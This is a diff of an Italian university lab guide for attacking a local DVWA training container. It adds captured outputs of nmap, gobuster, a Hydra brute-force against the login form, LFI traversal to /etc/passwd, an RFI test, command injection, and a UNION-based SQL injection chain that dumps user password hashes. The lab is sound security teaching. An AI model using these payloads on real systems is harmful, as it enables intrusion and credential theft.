@@ -16,6 +16,33 @@
 ```bash
 sudo ss -tulpn
 ```
+
+	┌─[lorenzo@parrot]─[~]  
+	└──╼ $sudo ss -tulpn  
+	Netid   State    Recv-Q    Send-Q                                Local Address:Port       Peer Address:Port     
+Process  
+	udp     UNCONN   0         0                                    192.168.56.103:123             0.0.0.0:*        
+	users:(("ntpd",pid=1042,fd=22))  
+	udp     UNCONN   0         0                                         10.0.2.15:123             0.0.0.0:*        
+	users:(("ntpd",pid=1042,fd=21))  
+	udp     UNCONN   0         0                                         127.0.0.1:123             0.0.0.0:*        
+	users:(("ntpd",pid=1042,fd=18))  
+	udp     UNCONN   0         0                                           0.0.0.0:123             0.0.0.0:*        
+	users:(("ntpd",pid=1042,fd=17))  
+	udp     UNCONN   0         0                [fe80::85fe:6b94:5216:2954]%enp0s8:123                [::]:*        
+	users:(("ntpd",pid=1042,fd=25))  
+	udp     UNCONN   0         0                [fe80::5e81:84f8:56ea:a4fa]%enp0s3:123                [::]:*        
+	users:(("ntpd",pid=1042,fd=24))  
+	udp     UNCONN   0         0            [fd17:625c:f037:2:db52:2b05:5624:7801]:123                [::]:*        
+	users:(("ntpd",pid=1042,fd=23))  
+	udp     UNCONN   0         0                                             [::1]:123                [::]:*        
+	users:(("ntpd",pid=1042,fd=19))  
+	udp     UNCONN   0         0                                              [::]:123                [::]:*        
+	users:(("ntpd",pid=1042,fd=16))
+
+> ✅ Solo `udp/123` (ntpd) — nessun TCP in ascolto, porta 80 libera. Si può procedere.
+> `ss -tulpn`: `-t` TCP, `-u` UDP, `-l` listening, `-p` processo, `-n` numerico. Ogni riga mostra indirizzo:porta e processo responsabile.
+
 Se appare nginx in ascolto sulla 80, fermalo:
 ```bash
 sudo service nginx stop
@@ -32,17 +59,70 @@ git clone https://github.com/eystsen/pentestlab.git && cd pentestlab
 ./pentestlab.sh start dvwa
 ```
 
+> ⚠️ `http://dvwa` reindirizzato su HTTPS da Firefox → vedere **Troubleshooting → Firefox reindirizza http://dvwa su HTTPS**.
+> ⚠️ Con Podman: `./pentestlab.sh start dvwa` fallisce con errore registry → vedere **Troubleshooting → Podman al posto di Docker**.
+
+
 4. **Prima configurazione DVWA** (solo al primissimo avvio):
    - Apri `http://dvwa` nel browser di Parrot
    - Login: `admin` / `password`
    - Vai su **Setup** → **Create / Reset Database**
    - Vai su **DVWA Security** → seleziona `low` → **Submit**
 
+> ✅ DVWA configurato: database creato, livello sicurezza `low`.
+
 5. Verifica il tuo IP host (ti servirà per RFI e Hydra):
 ```bash
 ip a
 ```
-⚠️ Gli IP nel PDF (.32/.33/.34/.5) sono esempi dell'anno scorso. Il tuo IP è quello della tua interfaccia host-only.
+
+> ✅ IP host-only (per RFI e Hydra): `192.168.56.103` su `enp0s8`. IP container DVWA: `127.8.0.1` (port-forward Podman — vedere Troubleshooting). Output completo di `ip a` in Esercizio 1.
+> ⚠️ Gli IP nel PDF (.32/.33/.34/.5) sono esempi dell'anno scorso.
+
+---
+
+## Troubleshooting Setup
+
+### Podman al posto di Docker (Parrot OS)
+Parrot OS usa Podman come backend container, non Docker. Podman emula la CLI di Docker ma richiede il registry esplicito per le immagini.
+
+**Sintomo**: `./pentestlab.sh start dvwa` termina con:
+```
+Error: short-name "vulnerables/web-dvwa" did not resolve to an alias
+```
+
+**Fix** — esegui manualmente con registry completo:
+```bash
+sudo docker pull docker.io/vulnerables/web-dvwa
+sudo docker run --name dvwa -d -p 127.8.0.1:80:80 docker.io/vulnerables/web-dvwa
+```
+
+Verifica che il container sia attivo:
+```bash
+sudo docker ps
+# deve mostrare una riga con "dvwa" e STATUS "Up"
+```
+
+### Es.1 — nmap non trova il container (Podman)
+Con Podman, pentestlab espone DVWA su `127.8.0.1:80` — un indirizzo loopback. Gli indirizzi `127.x.x.x` non appaiono in nessun `nmap -sn` perché non viaggiano su interfacce di rete reali. La discovery nmap dell'Es.1 è pensata per Docker standard, dove il container ottiene un IP sul bridge `172.17.0.0/16`.
+
+**Con Podman**: usa `127.8.0.1` come `IP_DVWA` direttamente (lo trovi in `/etc/hosts` o nell'output di pentestlab.sh). I comandi nmap dell'Es.1 diventano:
+```bash
+nmap -sT -p- 127.8.0.1
+nmap -sV -p 80 127.8.0.1
+```
+
+### Firefox reindirizza http://dvwa su HTTPS
+Firefox HTTPS-Only Mode upgrada automaticamente le URL HTTP.
+
+**Fix opzione 1** — disabilita HTTPS-Only Mode:
+Impostazioni → Privacy e Sicurezza → "Modalità solo HTTPS" → seleziona "Non attivare"
+
+**Fix opzione 2** — usa l'IP diretto (bypassa il problema):
+```
+http://127.8.0.1
+```
+pentestlab mappa `dvwa` a `127.8.0.1` in `/etc/hosts` — i due URL sono equivalenti.
 
 ---
 
@@ -81,6 +161,66 @@ nmap -sT -p- IP_DVWA
 nmap -sV -p 80,8080 IP_DVWA
 ```
 
+┌─[lorenzo@parrot]─[~/pentestlab]
+└──╼ $ip a
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWNgroup default qlen 1000
+link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+inet 127.0.0.1/8 scope host lo
+valid_lft forever preferred_lft forever
+inet6 ::1/128 scope host noprefixroute
+valid_lft forever preferred_lft forever
+2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
+link/ether 08:00:27:16:e5:88 brd ff:ff:ff:ff:ff:ff
+altname enx08002716e588
+inet 10.0.2.15/24 brd 10.0.2.255 scope global dynamic noprefixroute enp0s3
+valid_lft 84848sec preferred_lft 84848sec
+inet6 fd17:625c:f037:2:db52:2b05:5624:7801/64 scope global dynamic noprefixroute
+valid_lft 86030sec preferred_lft 14030sec
+inet6 fe80::5e81:84f8:56ea:a4fa/64 scope link noprefixroute
+valid_lft forever preferred_lft forever
+3: enp0s8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
+link/ether 08:00:27:35:91:30 brd ff:ff:ff:ff:ff:ff
+altname enx080027359130
+inet 192.168.56.103/24 brd 192.168.56.255 scope global dynamic noprefixroute enp0s8
+valid_lft 549sec preferred_lft 549sec
+inet6 fe80::85fe:6b94:5216:2954/64 scope link noprefixroute
+valid_lft forever preferred_lft forever
+4: podman0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
+link/ether ca:be:85:dc:4b:4c brd ff:ff:ff:ff:ff:ff
+inet 10.88.0.1/16 brd 10.88.255.255 scope global podman0
+valid_lft forever preferred_lft forever
+inet6 fe80::c8be:85ff:fedc:4b4c/64 scope link proto kernel_ll
+valid_lft forever preferred_lft forever
+5: veth0@if2: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master podman0 state UP group default qlen 1000
+link/ether 22:22:b7:b4:4c:b3 brd ff:ff:ff:ff:ff:ff link-netns netns-54ca2fb9-6d2d-3d35-7fa6-944dfd4eddef
+inet6 fe80::2022:b7ff:feb4:4cb3/64 scope link proto kernel_ll
+valid_lft forever preferred_lft forever
+
+> **`ip a` — interfacce attive:**
+> - `enp0s3 · 10.0.2.15/24` — NAT VirtualBox (uscita internet)
+> - `enp0s8 · 192.168.56.103/24` — host-only (rete condivisa con l'host fisico)
+> - `podman0 · 10.88.0.1/16` — bridge interno Podman (rete dei container)
+> - `veth0@if2` — interfaccia virtuale del container DVWA su podman0 ✅ container attivo
+>
+> ⚠️ Con Podman il container non è su `192.168.56.0/24` — accessibile via port-forward a `127.8.0.1`. Usa `127.8.0.1` come `IP_DVWA` (vedere Troubleshooting).
+
+> **nmap -sT -p- 127.8.0.1**:
+> ```
+> PORT   STATE SERVICE
+> 80/tcp open  http
+> ```
+> ✅ Una sola porta aperta: TCP/80. Il container espone solo il web server, nessun altro servizio.
+> "Not shown: 65534 closed" = tutte le altre porte hanno risposto con TCP RST (closed ≠ filtered).
+
+> **nmap -sV -p 80,8080 127.8.0.1**:
+> ```
+> PORT     STATE  SERVICE    VERSION
+> 80/tcp   open   http       Apache httpd 2.4.25 ((Debian))
+> 8080/tcp closed http-proxy
+> ```
+> ✅ Apache 2.4.25 su Debian espone DVWA sulla porta 80. `-sV` legge il banner del servizio — senza di esso sai solo che la porta è aperta, non cosa gira sopra.
+> 8080 `closed`: Podman ha risposto con TCP RST — porta esistente ma nessun processo in ascolto. Nessun proxy o secondo web server attivo.
+
 **Anatomia dei comandi**:
 - `ip a` — mostra tutte le interfacce con i loro indirizzi IP. Serve per conoscere il proprio IP e subnet prima di qualsiasi scansione.
 - `sudo nmap -sn <subnet>` — *ping scan*: invia ARP request (su rete locale) per scoprire quali host sono vivi senza scansionare porte. Richiede `sudo` per usare ARP; senza sudo usa ICMP, meno affidabile su rete locale.
@@ -111,6 +251,37 @@ PORT   STATE SERVICE VERSION
 gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u http://dvwa
 ```
 
+> gobuster non esplora ricorsivamente le directory — è un **brute-forcer di path**: prende ogni parola da `big.txt` (es. `admin`, `config`, `phpmyadmin`) e costruisce `http://dvwa/<parola>`, mandando una richiesta HTTP per ciascuna. Se risponde 200/301/403 → path esiste; 404 → non esiste. Non segue link, non entra nelle cartelle trovate: scopre solo *quali path esistono* alla radice.
+
+> **Output ottenuto** (`http://127.8.0.1`):
+> ```
+> /.htaccess            (Status: 403)
+> /.htpasswd            (Status: 403)
+> /README.md            (Status: 200)
+> /config               (Status: 301) → http://127.8.0.1/config/
+> /docs                 (Status: 301)
+> /external             (Status: 301)
+> /favicon.ico          (Status: 200)
+> /robots.txt           (Status: 200)
+> /server-status        (Status: 403)
+> ```
+>
+> **Come leggere i codici HTTP**:
+> - `200` — esiste ed è accessibile in lettura
+> - `301` — redirect: la directory esiste, Apache aggiunge lo slash finale
+> - `403` — Forbidden: il server sa che esiste ma nega l'accesso
+> - `404` — non esiste (gobuster li filtra di default — per questo non appaiono)
+>
+> **Cosa è interessante**:
+> - `/config` (301): contiene `config.inc.php` con credenziali del database — path da esplorare
+> - `/README.md` (200): espone la versione di DVWA — informazione utile al ricognitore
+> - `/server-status` (403): endpoint Apache mod_status — bloccato, ma se mal configurato esporrebbe statistiche interne del server
+> - `/.htaccess` / `/.htpasswd` (403): il server li conosce ma li protegge; in caso di misconfiguration sarebbero leggibili
+>
+> ⚠️ `/phpmyadmin` non trovato — questa immagine Docker non lo include. L'output atteso nella guida era basato su una versione diversa di DVWA.
+
+
+
 **Anatomia del comando**:
 - `gobuster dir` — modalità directory/file brute-force (vs `dns` per sottodomini, `vhost` per virtual host).
 - `-w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt` — wordlist da provare come path. Su Parrot le SecLists stanno in `/usr/share/wordlists/`. `big.txt` è ampia e bilanciata per web content discovery.
@@ -130,6 +301,16 @@ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u h
 
 **Cosa verificare**: `/phpmyadmin` è esposto (A5 Security Misconfiguration — interfaccia admin del DB accessibile). `/config` può contenere file di configurazione con credenziali. `/robots.txt` può rivelare path che l'admin voleva nascondere.
 
+> **Bonus — pagina Setup DVWA** (`http://127.8.0.1/setup.php`):
+> Rivela informazioni critiche senza autenticazione:
+> - Percorso esatto del config: `/var/www/html/config/config.inc.php` → usarlo direttamente in Es.4 LFI
+> - Credenziali DB parziali: utente `app`, database `dvwa`, host `127.0.0.1` (password nascosta ma leggibile via LFI)
+> - `allow_url_include: Disabled` → RFI non funziona (confermato)
+> - `allow_url_fopen: Enabled` → LFI funziona
+> - `www-data` scrive in `/hackable/uploads/` → in scenari reali: upload webshell PHP + esecuzione via LFI
+> - PHP 7.0.30 (EOL 2019) → versione con CVE noti
+> Questa è A5 Security Misconfiguration: informazioni di sistema esposte senza autenticazione.
+
 ---
 
 ### Esercizio 3 — Brute Force Login (Burp + Hydra)
@@ -145,21 +326,22 @@ Step 1 — Intercetta la request con Burp:
 # Avvia Burp Community Edition dal menu applicazioni
 # Usa le default settings + "Temporary project"
 # In Burp: Proxy → Intercept is ON
-# Configura Firefox/Chromium per usare il proxy 127.0.0.1:8080
-# Vai su http://dvwa/vulnerabilities/brute/ e digita "prova"/"prova" → Login
-# Burp mostra la request intercettata:
-# GET /vulnerabilities/brute/?username=prova&password=prova&Login=Login HTTP/1.1
-# Cookie: security=low; PHPSESSID=<tuo_session_id>
-# Nota il tuo PHPSESSID — ti serve per il comando Hydra
+# Apri il browser integrato di Burp (tasto "Open Browser" nel tab Proxy)
+#   ⚠️ Se il browser di Burp carica all'infinito: usa Firefox con proxy manuale
+#      Impostazioni Firefox → Rete → Proxy manuale → 127.0.0.1:8080
+# Vai su http://127.8.0.1/vulnerabilities/brute/ e digita "prova"/"prova" → Login
+# Burp intercetta la request — cerca la riga Cookie:
+#   Cookie: PHPSESSID=<tuo_session_id>; security=low
+# Nota il PHPSESSID — serve nel comando Hydra. Il cookie scade: riacquistalo ogni volta
 ```
 
 Step 2 — Lancia Hydra con i dati catturati:
 ```bash
-hydra IP_CONTAINER_DVWA \
+hydra 127.8.0.1 \
   -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt \
-  -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-100.txt \
+  -P /usr/share/wordlists/fasttrack.txt \
   http-get-form \
-  "/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=<tuo_session_id>"
+  "/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: PHPSESSID=<tuo_session_id>; security=low:Username and/or password incorrect."
 ```
 
 Step 3 (bonus) — Genera wordlist contestuale da sito con cewl:
@@ -170,20 +352,23 @@ cewl -d 1 -m 5 https://ulisse.unibo.it
 **Anatomia dei comandi**:
 - `hydra <IP>` — target dell'attacco. Hydra prova ogni combinazione username/password contro il servizio specificato.
 - `-L <file>` — lista di username da provare. `-l admin` per un singolo username noto.
-- `-P <file>` — lista di password da provare. `-p password` per una singola password.
+- `-P <file>` — lista di password da provare. `fasttrack.txt` è pensata per attacchi rapidi su credenziali comuni (222 password); su Parrot: `/usr/share/wordlists/fasttrack.txt`.
 - `http-get-form` — modulo per form HTTP GET. Per POST: `http-post-form`.
-- La stringa finale ha formato `"path:parametri:stringa_errore:header"`:
+- La stringa ha formato `"path:parametri[:optional...]:condition_string"` — **la condition va sempre ULTIMA**:
   - `^USER^` e `^PASS^` = placeholder sostituiti da Hydra per ogni tentativo
-  - La stringa dopo il terzo `:` è il testo che appare quando il login **fallisce** — Hydra deduce il successo dalla sua assenza
-  - `H=Cookie:...` = header custom necessario perché DVWA verifica il PHPSESSID; se scade il cookie, Hydra non funziona
+  - `H=Cookie\: ...` = header custom (il `\:` escapa il due punti nell'header — è richiesto da Hydra 9.5)
+  - L'ultima stringa è il testo che appare quando il login **fallisce** — Hydra deduce il successo dalla sua assenza
 - `cewl -d 1 -m 5 <url>` — crawla il sito a profondità 1 estraendo parole di almeno 5 caratteri. Genera una wordlist contestuale: parole che l'amministratore del sito potrebbe usare come password.
 
-⚠️ **Il PHPSESSID nel comando Hydra è il TUO cookie di sessione attivo**, non quello del PDF. Copialo da Burp ogni volta che lanci Hydra.
+> ⚠️ **Hydra 9.5 vs PDF**: la guida del prof usa la sintassi `...condition:H=Cookie:...` (condition prima dell'header). In Hydra 9.5 il parser è cambiato: **la condition string deve essere l'ultimo campo**, dopo tutti gli optional (`H=`, `C=`, ecc.). La sintassi del PDF funziona su Hydra 8.x — su 9.5 produce parse error.
+
+> ⚠️ **Il PHPSESSID nel comando Hydra è il TUO cookie di sessione attivo**, non quello del PDF. Copialo da Burp ogni volta che lanci Hydra (scade alla chiusura della sessione browser).
 
 **Output atteso**:
 ```
-[DATA] attacking http-get-form://192.168.56.X:80/vulnerabilities/brute/...
-[80][http-get-form] host: 192.168.56.X   login: admin   password: password
+[INFORMATION] escape sequence \: detected in module option, no parameter verification is performed.
+[DATA] attacking http-get-form://127.8.0.1:80/vulnerabilities/brute/...
+[80][http-get-form] host: 127.8.0.1   login: admin   password: password
 1 of 1 target successfully completed, 1 valid password found
 ```
 
@@ -203,8 +388,23 @@ LFI — leggi `/etc/passwd` via path traversal:
 ```
 # Nel browser, DVWA → File Inclusion
 # Modifica il parametro page= nella URL:
-http://dvwa/vulnerabilities/fi/?page=../../../../etc/passwd
+http://127.8.0.1/vulnerabilities/fi/?page=../../../../../etc/passwd
 ```
+
+> ⚠️ Servono **5** livelli `../`, non 4. La webroot è `/var/www/html/vulnerabilities/fi/` — cinque directory sopra c'è la radice `/`. Con 4 livelli si arriva a `/var/` → `/var/etc/passwd` non esiste → schermata vuota.
+
+> **Output ottenuto** — `/etc/passwd` del container:
+> ```
+> root:x:0:0:root:/root:/bin/bash
+> www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+> mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false
+> ...
+> ```
+> Cosa rivela:
+> - `www-data` (UID 33) — utente con cui gira Apache/PHP; home `/var/www`; nessuna shell (`/usr/sbin/nologin`). Command injection o webshell girerebbe con questo UID.
+> - `mysql` (UID 101) — MySQL è in esecuzione nel container, senza shell di login.
+> - Nessun utente reale con `/bin/bash` tranne `root` — tipico container minimal.
+> - Il file è leggibile da www-data → **A1 Broken Access Control** confermato: un parametro URL ha esposto un file di sistema senza autenticazione.
 
 RFI — includi file PHP remoto (richiede abilitazione manuale):
 ```bash
@@ -219,7 +419,7 @@ python3 -m http.server 8081
 ```
 
 **Anatomia dei comandi**:
-- `../../../../etc/passwd` — ogni `../` risale di un livello dalla webroot di DVWA. Quattro livelli portano alla radice `/`, poi si accede a `/etc/passwd`. Il numero di `../` varia secondo la profondità della webroot; si prova incrementalmente finché non funziona.
+- `../../../../../etc/passwd` — ogni `../` risale di un livello dalla webroot di DVWA (`/var/www/html/vulnerabilities/fi/`). Cinque livelli portano alla radice `/`, poi si accede a `/etc/passwd`. Il numero di `../` varia secondo la profondità della webroot; si prova incrementalmente finché non funziona.
 - `python3 -m http.server 8081` — avvia un web server HTTP minimale sulla porta 8081 nella directory corrente. Permette al server DVWA di raggiungere `test.php` via GET. Il modulo `http.server` è built-in Python — nessuna installazione.
 - `echo '<?php ... ?>' > test.php` — crea un file PHP minimale come proof-of-concept. Se DVWA mostra "Hello World", ha scaricato e *eseguito* il PHP remoto (RFI con esecuzione). Se mostra il sorgente PHP, l'esecuzione remota è disabilitata.
 
@@ -273,15 +473,18 @@ dvwa:x:1000:1000:dvwa,,,:/home/dvwa:/bin/bash
 
 ⚠️ **Livello medium DVWA** filtra `;` ma non `&&` → usare `&& ls` su difficoltà medium. Su low funzionano entrambi.
 
-**Output atteso**:
+**Output ottenuto**:
 ```
 # Dopo "127.0.0.1; ls":
 PING 127.0.0.1 (127.0.0.1) ...
-dvwa  hackable  index.php  ...
+help  index.php  source
 
-# Dopo "; id":
+# Dopo "127.0.0.1; id":
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
+
+> `ls` ha listato i file nella directory corrente del processo: `/var/www/html/vulnerabilities/exec/`. Il server ha eseguito il comando — RCE confermato.
+> `id` conferma che il processo gira come `www-data` (UID 33), non root. Non è privilegiato, ma può leggere file di config con credenziali DB, scrivere nella webroot, o aprire una reverse shell verso l'attaccante.
 
 **Cosa verificare**: vedi l'output di comandi arbitrari nella pagina web — RCE confermato. Il processo gira come `www-data` (non root), ma dalla webroot potresti leggere file di config con credenziali del DB.
 
@@ -291,9 +494,31 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 **Obiettivo**: alterare la logica della query SQL per ottenere tutti i record della tabella utenti invece di uno solo.
 
-**Concetto**: il parametro `id` viene concatenato direttamente nella query PHP senza sanitizzazione:  
-`$getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id'"`.  
-Un apostrofo nel payload rompe la stringa SQL; la condizione `OR 'a'='a` rende il WHERE always-true → tutti i record.
+**Concetto**: il parametro `id` viene concatenato direttamente nella query PHP senza sanitizzazione. Un apostrofo nel payload rompe la stringa SQL; la condizione `OR 'a'='a` rende il WHERE always-true → tutti i record.
+
+**Perché funziona — il codice PHP**:
+
+Il codice sorgente di DVWA (livello low) fa esattamente questo:
+```php
+$id = $_GET['id'];                          // prende l'input grezzo dalla URL
+$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
+$result = mysqli_query($GLOBALS["___mysqli_ston"], $query);
+```
+
+Con input normale `1`, la query diventa:
+```sql
+SELECT first_name, last_name FROM users WHERE user_id = '1'
+```
+→ restituisce solo l'utente con ID 1.
+
+Con il payload `' OR 'a'='a`, la query diventa:
+```sql
+SELECT first_name, last_name FROM users WHERE user_id = '' OR 'a'='a'
+```
+- `'` — chiude la stringa aperta dal PHP (`WHERE user_id = '`). Ora il DB vede un valore vuoto per user_id.
+- `OR 'a'='a` — aggiunge una condizione always-true: `'a'='a'` è sempre verificato.
+- Il WHERE diventa: "dammi le righe dove user_id è vuoto **oppure** 'a'='a'". La seconda condizione è sempre vera → **tutte le righe** della tabella.
+- L'apostrofo finale del PHP (`'`) chiude il `'a` dell'ultimo `'a'` — la query è sintatticamente corretta senza bisogno di un commento `#`.
 
 **Comandi**:
 ```
@@ -302,26 +527,18 @@ Un apostrofo nel payload rompe la stringa SQL; la condizione `OR 'a'='a` rende i
 ' OR 'a'='a
 ```
 
-**Anatomia del payload**:
-- `'` — chiude la stringa aperta dal codice PHP (`WHERE user_id = '`). Senza questo, il DB riceverebbe l'input come valore letterale.
-- `OR 'a'='a` — aggiunge una condizione always-true. `'a'='a'` è sempre vero in SQL.
-- La query risultante: `SELECT First_Name, Last_Name FROM users WHERE ID='' OR 'a'='a';`
-- Nessun `#` finale necessario qui perché il payload chiude correttamente la stringa prima del `'` finale del PHP.
-
-**Output atteso**:
+**Output ottenuto**:
 ```
-ID: ' OR 'a'='a
-First name: admin
-Surname: admin
-
-ID: ' OR 'a'='a
-First name: Gordon
-Surname: Brown
-
-[... tutti gli utenti del DB ...]
+ID: ' OR 'a' = 'a     First name: admin      Surname: admin
+ID: ' OR 'a' = 'a     First name: Gordon     Surname: Brown
+ID: ' OR 'a' = 'a     First name: Hack       Surname: Me
+ID: ' OR 'a' = 'a     First name: Pablo      Surname: Picasso
+ID: ' OR 'a' = 'a     First name: Bob        Surname: Smith
 ```
 
-**Cosa verificare**: la pagina restituisce tutti gli utenti invece di uno — la logica del WHERE è stata bypassata. Questo funziona anche su form di login: `' OR '1'='1` bypassa l'autenticazione.
+> Tutti e 5 gli utenti del DB restituiti — la logica del WHERE è stata completamente bypassata. ✅
+
+**Cosa verificare**: la pagina restituisce tutti gli utenti invece di uno — la logica del WHERE è stata bypassata. Questo funziona anche su form di login: `' OR '1'='1` bypassa l'autenticazione perché la query `WHERE password='...' OR '1'='1'` è always-true.
 
 ---
 
@@ -329,11 +546,33 @@ Surname: Brown
 
 **Obiettivo**: estrarre credenziali dal database usando la tecnica UNION per aggiungere una seconda query alla query originale.
 
-**Concetto**: `UNION SQL` concatena i risultati di due SELECT a patto che abbiano lo stesso numero di colonne. La catena è in 4 passi: (1) scopri il numero di colonne con NULL progressivi → (2) estrai metadati (versione, hostname, DB corrente) → (3) naviga `information_schema` per mappare la struttura → (4) estrai le credenziali reali. `#` commenta il `'` finale che il codice PHP aggiunge dopo il parametro.
+**Concetto**: `UNION SQL` concatena i risultati di due SELECT a patto che abbiano lo stesso numero di colonne. La logica è una ricognizione a imbuto in 4 passi — ogni passo usa le informazioni del passo precedente per sapere cosa chiedere dopo.
+
+**Il filo logico — perché ogni passo porta al successivo**:
+
+```
+Passo 1: quante colonne ha la query originale?
+         → serve per costruire UNION valide (stesso numero di colonne)
+         ↓
+Passo 2: che DBMS è? che DB è attivo?
+         → @@version dice il DBMS (MySQL/MariaDB/PostgreSQL hanno sintassi diverse)
+         → database() dice il nome del DB corrente (quello da attaccare)
+         ↓
+Passo 3a: quali tabelle esistono in quel DB?
+          → information_schema.tables filtrato per table_schema='dvwa'
+          ↓
+Passo 3b: quali colonne ha la tabella 'users'?
+          → information_schema.columns filtrato per table_name='users'
+          ↓
+Passo 4: estrai i dati reali con i nomi esatti trovati al passo 3b
+         → SELECT user,password FROM users
+```
+
+Non puoi saltare passi: senza il numero di colonne la UNION dà errore; senza i nomi delle tabelle non sai cosa selezionare; senza i nomi delle colonne non sai quali campi estrarre.
 
 **Comandi**:
 
-Step 1 — Scopri il numero di colonne:
+Step 1 — Scopri il numero di colonne (prova finché non dà errore):
 ```sql
 ' union select NULL #
 ```
@@ -341,66 +580,67 @@ Step 1 — Scopri il numero di colonne:
 ```sql
 ' union select NULL,NULL #
 ```
-→ nessun errore: **2 colonne**!
+→ riga vuota restituita: **2 colonne** ✅
 
-Step 2 — Estrai metadati del server:
+Step 2 — Metadati del server (sai il DBMS e il DB target):
 ```sql
 ' union select NULL,@@version #
+```
+> `Surname: 10.1.26-MariaDB-0+deb9u1` — MariaDB su Debian 9. Confermato MySQL-compatibile → `information_schema` disponibile.
+
+```sql
 ' union select NULL,@@hostname #
+```
+> `Surname: a6cabeb4862c` — hostname del container Docker.
+
+```sql
 ' union select NULL,database() #
 ```
+> `Surname: dvwa` — DB attivo: `dvwa`. Questo è il nome da usare nel filtro `table_schema=` al passo successivo.
 
-Step 3 — Enumera la struttura del database:
+Step 3 — Mappa la struttura (prima i DB, poi le tabelle, poi le colonne):
 ```sql
 ' union select null,schema_name from information_schema.schemata #
 ```
-→ mostra tutti i DB: `information_schema`, `cdcol`, `dvwa`, `mysql`, `phpmyadmin`, `test`
+> DB presenti: `dvwa`, `information_schema` — container minimale, nessun DB di sistema aggiuntivo.
 
 ```sql
 ' union select null,table_name from information_schema.tables where table_schema='dvwa' #
 ```
-→ tabelle in dvwa: `guestbook`, `users`
+> Tabelle in `dvwa`: `guestbook`, `users` — ci interessa `users`.
 
 ```sql
 ' union select null,column_name from information_schema.columns where table_name='users' #
 ```
-→ colonne di users: `user_id`, `first_name`, `last_name`, `user`, `password`, `avatar`
+> Colonne di `users`: `user_id`, `first_name`, `last_name`, `user`, `password`, `avatar`, `last_login`, `failed_login`.
+> Le colonne utili sono `user` e `password` — nomi esatti da usare nel passo 4.
 
-Step 4 — Estrai le credenziali:
+Step 4 — Estrai le credenziali con i nomi trovati al passo 3:
 ```sql
 ' union select user,password from users #
 ```
 
+**Output ottenuto**:
+```
+admin    5f4dcc3b5aa765d61d8327deb882cf99
+gordonb  e99a18c428cb38d5f260853678922e03
+1337     8d3533d75ae2c3966d7e0d4fcc69216b
+pablo    0d107d09f5bbe40cade3de5c71e9e9b7
+smithy   5f4dcc3b5aa765d61d8327deb882cf99
+```
+`5f4dcc3b5aa765d61d8327deb882cf99` = MD5 di "password" (admin e smithy hanno la stessa password). Hash MD5 senza salt — cercabile su qualsiasi rainbow table online.
+
 **Anatomia dei payload**:
-- `' union select NULL,NULL #` — l'apostrofo iniziale chiude la stringa del parametro. `UNION` appaia una seconda SELECT. I `NULL` sono placeholder neutrali compatibili con qualsiasi tipo di colonna. `#` commenta tutto ciò che segue nella query originale, incluso il `'` di chiusura del PHP.
-- `@@version` / `@@hostname` — variabili di sistema MySQL: restituiscono versione del server e hostname della macchina. `database()` = nome del DB attualmente selezionato.
-- `information_schema` — database di sistema MySQL/MariaDB che contiene la mappa completa di tutti gli altri DB: `.schemata` lista i database, `.tables` lista le tabelle, `.columns` lista le colonne. È la "mappa del tesoro" per chi fa SQLi.
-- `where table_schema='dvwa'` — filtra le tabelle per restare nel DB target e non ricevere migliaia di righe da tutti i DB di sistema.
-- `' union select user,password from users #` — usa i nomi di colonna trovati allo Step 3. Nota: `user` e `password` sono i nomi trovati, non parole chiave SQL.
+- `'` iniziale — chiude la stringa del parametro aperta dal PHP (`WHERE user_id = '`). Senza questo l'input viene trattato come valore letterale, non come SQL.
+- `UNION SELECT` — concatena una seconda query. I risultati appaiono nelle stesse colonne della query originale (First name / Surname).
+- `NULL` — placeholder neutro compatibile con qualsiasi tipo di colonna. Serve per trovare il numero di colonne senza sapere i tipi.
+- `#` — commenta il `'` finale che il PHP aggiunge dopo il parametro, altrimenti la query avrebbe un apostrofo spaiato → errore di sintassi SQL.
+- `@@version` / `@@hostname` / `database()` — variabili e funzioni MySQL che restituiscono metadati del server senza toccare tabelle utente.
+- `information_schema` — DB di sistema MySQL/MariaDB sempre presente, contiene la mappa dell'intera struttura. `.schemata` = lista DB; `.tables` = lista tabelle; `.columns` = lista colonne. È la stessa "mappa" usata da ogni tool di SQLi automatico (sqlmap, ecc.).
 
-⚠️ **information_schema è specifico di MySQL/MariaDB** (presente in DVWA). Per PostgreSQL si usa `pg_catalog`; per SQLite si usa `sqlite_master`. Le query vanno adattate al DBMS trovato con `@@version`.
+⚠️ **information_schema è specifico di MySQL/MariaDB**. Per PostgreSQL: `pg_catalog`; per SQLite: `sqlite_master`. Ecco perché il passo 2 (identificare il DBMS con `@@version`) viene prima della mappatura.
 
-**Output atteso** (Step 4):
-```
-ID: ' union select user,password from users #
-First name: admin
-Surname: 5f4dcc3b5aa765d61d8327deb882cf99
-
-First name: gordonb
-Surname: e99a18c428cb38d5f260853678922e03
-
-First name: 1337
-Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
-
-First name: pablo
-Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
-
-First name: smithy
-Surname: 5f4dcc3b5aa765d61d8327deb882cf99
-```
-`5f4dcc3b5aa765d61d8327deb882cf99` = MD5 di "password". Gli hash MD5 senza salt sono craccabili con rainbow table o ricerca online.
-
